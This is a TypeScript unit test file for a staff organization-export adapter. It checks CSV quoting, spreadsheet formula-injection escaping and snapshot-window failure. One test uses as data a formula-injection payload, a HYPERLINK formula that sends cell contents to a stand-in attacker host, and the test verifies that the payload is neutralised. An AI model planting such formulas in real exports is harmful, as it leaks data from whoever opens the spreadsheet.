import { describe, expect, it } from 'vitest'
import type { Database } from '#/shared/db'
import { buildOrganizationExportBundle } from '#/contexts/identity/application/organization-export-contract'
import type { OrganizationExportContribution } from '#/contexts/identity/application/ports/organization-export-contributor.port'
import { ORGANIZATION_LIFECYCLE_CONTEXTS } from '#/contexts/identity/domain/organization-lifecycle'
import { createStaffOrganizationExportContributor } from './staff-organization-export.adapter'

type StubRows = readonly Record<string, unknown>[]

/**
 * The adapter issues exactly one snapshot-clock query followed by one query per
 * collection, in declaration order. Feeding the responses positionally keeps the
 * unit test honest about that order without a database.
 */
function stubDatabase(responses: readonly StubRows[]): Database {
  let index = 0
  const snapshot = {
    execute: async () => ({ rows: responses[index++] ?? [] }),
  }
  return {
    transaction: async (run: (tx: typeof snapshot) => Promise<unknown>) => run(snapshot),
  } as unknown as Database
}

const ASOF = new Date('2026-03-01T00:00:00.000Z')
const SNAPSHOT_AT = new Date('2026-03-01T00:01:00.000Z')

const PARTICIPANT = {
  id: '11111111-1111-4111-8111-111111111111',
  display_name: 'Front Desk, Dana "D" Rivera',
  status: 'active',
  revision: 1,
  archived_at: null,
  archive_reason: null,
  created_by: 'user-admin',
  created_at: '2026-01-01T00:00:00.000000Z',
  updated_at: '2026-01-01T00:00:00.000000Z',
}

const USER_LINK = {
  id: '22222222-2222-4222-8222-222222222222',
  staff_participant_id: PARTICIPANT.id,
  user_id: 'user-dana',
  effective_from: '2026-01-01T00:00:00.000000Z',
  effective_to: null,
  end_reason: null,
  created_by: 'user-admin',
}

const PARTICIPATION = {
  id: '33333333-3333-4333-8333-333333333333',
  property_id: '44444444-4444-4444-8444-444444444444',
  staff_participant_id: PARTICIPANT.id,
  user_id: null,
  display_name: 'Dana Rivera',
  status: 'active',
  revision: 1,
  started_at: '2026-01-02T00:00:00.000000Z',
  ended_at: null,
  archive_reason: null,
  created_by: 'user-admin',
  created_at: '2026-01-02T00:00:00.000000Z',
  updated_at: '2026-01-02T00:00:00.000000Z',
}

const POPULATED: readonly StubRows[] = [
  [{ snapshot_at: SNAPSHOT_AT }],
  [PARTICIPANT],
  [USER_LINK],
  [PARTICIPATION],
  [],
  [],
]

async function contribute(
  responses: readonly StubRows[],
): Promise<OrganizationExportContribution> {
  return createStaffOrganizationExportContributor(stubDatabase(responses)).contribute({
    organizationId: 'org-staff-export',
    requestId: 'request-1',
    asOf: ASOF,
  })
}

function entryText(contribution: OrganizationExportContribution, path: string): string {
  const entry = contribution.entries.find((candidate) => candidate.path === path)!
  return Buffer.from(entry.bytes).toString('utf8')
}

/** Staff's contribution beside an affirmative `no_data` from every other context. */
function bundleWith(staff: OrganizationExportContribution) {
  return buildOrganizationExportBundle({
    organizationId: 'org-staff-export',
    requestId: 'request-1',
    asOf: ASOF,
    contributors: ORGANIZATION_LIFECYCLE_CONTEXTS.map((context) => ({
      context,
      contribute: async () =>
        context === 'staff'
          ? staff
          : { context, coverage: 'no_data' as const, omissionCodes: [], entries: [] },
    })),
  })
}

describe('Staff Organization Export contributor', () => {
  it('quotes CSV separators and embedded quotes instead of shifting columns', async () => {
    const contribution = await contribute(POPULATED)
    const csv = contribution.entries.find(
      ({ path }) => path === 'staff/participants.csv',
    )!
    const lines = Buffer.from(csv.bytes).toString('utf8').trimEnd().split('\n')

    expect(lines[0]).toBe(
      'record_type,id,display_name,status,revision,archived_at,archive_reason,' +
        'created_by,created_at,updated_at,staff_participant_id,user_id,' +
        'effective_from,effective_to,end_reason',
    )
    expect(lines[1]).toContain('"Front Desk, Dana ""D"" Rivera"')
    // The user-link row leaves the participant-only columns blank rather than
    // sliding its own values left.
    expect(lines[2]).toContain('staff_participant_user_link,')
    expect(lines).toHaveLength(3)
  })

  it('opens a formula-shaped display name as text while the JSON keeps it exact', async () => {
    // A PropertyManager can set any display name; the AccountAdmin who opens
    // the export in a spreadsheet must not get a live exfiltrating link.
    const hostile = '=HYPERLINK("https://attacker.example/leak?d="&A2&A3,"Open")'
    const contribution = await contribute([
      [{ snapshot_at: SNAPSHOT_AT }],
      [{ ...PARTICIPANT, display_name: hostile }],
      [],
      [{ ...PARTICIPATION, display_name: '@SUM(A1:A9)' }],
      [],
      [],
    ])

    expect(entryText(contribution, 'staff/participants.csv')).toContain(
      '"\'=HYPERLINK(""https://attacker.example/leak?d=""&A2&A3,""Open"")"',
    )
    expect(entryText(contribution, 'staff/participations.csv')).toContain(
      ",'@SUM(A1:A9),",
    )
    const json = JSON.parse(entryText(contribution, 'staff/participants.json')) as {
      participants: readonly { display_name: string }[]
    }
    expect(json.participants[0].display_name).toBe(hostile)
    await expect(bundleWith(contribution)).resolves.toMatchObject({
      version: 'organization-export/v1',
    })
  })

  it('fails closed when the request is older than the bounded snapshot window', async () => {
    const contributor = createStaffOrganizationExportContributor(stubDatabase(POPULATED))

    await expect(
      contributor.contribute({
        organizationId: 'org-staff-export',
        requestId: 'request-1',
        asOf: new Date(SNAPSHOT_AT.getTime() - 16 * 60 * 1000),
      }),
    ).rejects.toThrow(/snapshot window is unavailable/u)
  })
})
